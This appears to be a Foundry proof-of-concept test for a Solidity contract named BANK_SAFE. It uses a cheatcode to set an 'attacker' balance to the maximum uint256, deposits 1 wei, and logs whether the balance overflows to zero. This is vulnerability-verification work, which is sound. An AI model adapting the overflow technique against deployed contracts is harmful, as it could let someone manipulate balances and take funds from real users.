// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract BankSafeOverflowTest is Test {
    BANK_SAFE bank;
    LogFile logFile;
    
    address attacker = address(0xBAD);
    
    function setUp() public {
        // Deploy dependencies
        logFile = new LogFile();
        bank = new BANK_SAFE();
        
        // Setup contracts
        bank.SetLogFile(address(logFile));
        
        // Set attacker's initial balance to max_uint256
        vm.store(
            address(bank),
            bytes32(uint256(keccak256(abi.encode(attacker, uint256(0))))),
            bytes32(type(uint256).max)
        );
        
        // Fund attacker for test deposits
        vm.deal(attacker, 10 ether);
    }
    
    function test_balanceOverflow() public {
        vm.startPrank(attacker);
        
        // BEFORE: Retrieve attacker's initial bank balance
        uint256 initialBalance = bank.balances(attacker);
        console.log("--- BEFORE-Trigger Deposit ---");
        console.log("Attacker bank balance:", initialBalance);
        require(initialBalance == type(uint256).max, "Initial balance incorrect");
        
        console.log("--- Trigger Deposit (call with 1 wei) ---");
        (bool success,) = address(bank).call{value: 1}("");
        require(success, "Deposit failed");
        
        // AFTER: Retrieve attacker's bank balance after deposit
        uint256 finalBalance = bank.balances(attacker);
        console.log("--- AFTER-Trigger Deposit ---");
        console.log("Attacker bank balance:", finalBalance);
        
        // Differential verification
        bool exploitSuccess = (finalBalance == 0);
        console.log("Balance overflow occurred:", exploitSuccess ? "YES" : "NO");
        console.log(
            exploitSuccess 
            ? "Vulnerability Exists: Successfully overflowed attacker balance from max to 0"
            : "Vulnerability not Exist: Failed to overflow attacker balance"
        );
        
        vm.stopPrank();
    }
    
    function testDirect_DepositOverflow() public {
        vm.startPrank(attacker);
        
        // BEFORE: Retrieve attacker's initial bank balance
        uint256 initialBalance = bank.balances(attacker);
        console.log("--- BEFORE-Trigger Deposit ---");
        console.log("Attacker bank balance:", initialBalance);
        require(initialBalance == type(uint256).max, "Initial balance incorrect");
        
        console.log("--- Trigger Deposit (Direct Deposit function with 1 wei) ---");
        bank.Deposit{value: 1}();
        
        // AFTER: Retrieve attacker's bank balance after deposit
        uint256 finalBalance = bank.balances(attacker);
        console.log("--- AFTER-Trigger Deposit ---");
        console.log("Attacker bank balance:", finalBalance);
        
        // Differential verification
        bool exploitSuccess = (finalBalance == 0);
        console.log("Balance overflow occurred:", exploitSuccess ? "YES" : "NO");
        console.log(
            exploitSuccess 
            ? "Vulnerability Exists: Successfully overflowed attacker balance from max to 0"
            : "Vulnerability not Exist: Failed to overflow attacker balance"
        );
        
        vm.stopPrank();
    }
}